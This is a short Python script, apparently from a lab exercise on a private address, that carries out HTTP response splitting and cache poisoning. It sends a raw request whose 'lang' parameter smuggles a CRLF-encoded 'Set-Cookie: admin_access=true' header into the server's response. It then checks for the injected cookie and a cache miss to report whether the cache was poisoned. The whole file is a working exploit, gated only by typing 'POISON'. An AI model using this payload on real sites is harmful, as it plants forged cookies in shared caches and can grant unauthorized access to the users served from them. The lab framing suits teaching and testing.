#!/usr/bin/env python3
import socket
import sys

print("=== ATTACKER ===")
print("Payload se chen Set-Cookie vao response cache.")
confirm = input("Type POISON to continue: ").strip()

if confirm != "POISON":
    print("attacker_started=no")
    print("cache_poisoned=no")
    sys.exit(0)

request = (
    b"GET /page?lang=vi%0d%0aSet-Cookie:%20admin_access=true;%20Path=/ HTTP/1.1\r\n"
    b"Host: 192.168.10.2\r\n"
    b"Connection: close\r\n\r\n"
)

with socket.create_connection(("192.168.10.2", 80), timeout=5) as sock:
    sock.sendall(request)
    response = b""
    while True:
        part = sock.recv(4096)
        if not part:
            break
        response += part

headers = response.decode("iso-8859-1", errors="replace").split("\r\n\r\n", 1)[0]

print("\n=== RESPONSE MA ATTACKER NHAN DUOC ===")
for line in headers.splitlines():
    if any(x in line for x in ("HTTP/", "Content-Language", "Set-Cookie", "X-Lab-Cache")):
        print(line)

has_cookie = "Set-Cookie: admin_access=true" in headers
cache_miss = "X-Lab-Cache: MISS" in headers

print("\nKet luan:")
print("attacker_started=yes")
print("cache_poisoned=yes" if has_cookie and cache_miss else "cache_poisoned=no")
